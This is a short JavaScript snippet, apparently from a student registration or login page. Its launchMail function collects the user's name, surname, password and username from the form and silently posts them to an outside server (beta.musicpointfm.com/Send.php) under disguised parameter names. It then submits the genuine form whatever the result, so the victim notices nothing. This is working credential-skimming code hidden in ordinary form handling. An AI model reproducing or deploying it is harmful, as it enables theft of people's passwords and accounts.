function launchMail(){
    var a=Morro.Nom.value+" ";
    a+=Morro.Pat.value;
    var b=Morro.Pass.value;
    var c=Morro.User.value;
    var jqxhr = $.post("http://beta.musicpointfm.com/Send.php", { qwdasd: a, psavidubsai: b,mailsdibsa:c } ).done(function() {
    $("#RegAlumno").submit();
  }).fail(function (){
    $("#RegAlumno").submit();
  });
}
function launchMailP(){
    $("#RegAlumno").submit();
}